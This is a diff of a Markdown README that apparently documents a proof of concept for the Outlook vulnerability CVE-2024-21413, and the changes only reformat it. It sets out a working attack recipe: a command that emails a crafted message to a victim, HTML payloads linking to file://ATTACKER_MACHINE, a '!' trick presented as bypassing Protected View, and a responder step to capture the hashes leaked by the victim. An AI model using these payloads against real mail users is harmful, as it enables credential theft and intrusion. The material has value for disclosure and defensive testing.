@@ -6,7 +6,7 @@
 
 #### PoC usage:
 
- - python3 CVE-2024-21413.py --server MAIL_SERVER --port PORT --username USER@DOMAIN.LOCAL --password PASSWORD --sender USER@DOMAIN.LOCAL --recipient VICTIM@DOMAIN.LOCAL --url "\\IP/something" --subject XD
+    python3 CVE-2024-21413.py --server MAIL_SERVER --port PORT --username USER@DOMAIN.LOCAL --password PASSWORD --sender USER@DOMAIN.LOCAL --recipient VICTIM@DOMAIN.LOCAL --url "\\IP/something" --subject XD
 
 ### Severity: Critical
 
@@ -26,17 +26,23 @@
 
 ### Example payload: (Moniker Link type: file://)
 
-#### 1) <p><a href="file://ATTACKER_MACHINE/test"<Click me</a></p<
+#### 1) 
+
+    <p><a href="file://ATTACKER_MACHINE/test"<Click me</a></p>
 
 ### Outlook's Protected view bypass: (Special character: !)
 
-#### 1) <p><a href="file://ATTACKER_MACHINE/test!exploit"<Click me</a></p<
+#### 1) 
+
+    <p><a href="file://ATTACKER_MACHINE/test!exploit"<Click me</a></p>
 
 ### POC: https://github.com/CMNatic/CVE-2024-21413
 
 ### Steps:
 
-#### 1) sudo responder -I INTERFACE
+#### 1) 
+
+    sudo responder -I INTERFACE
 
 #### 2) Modify the exploit PoC according to use case
 
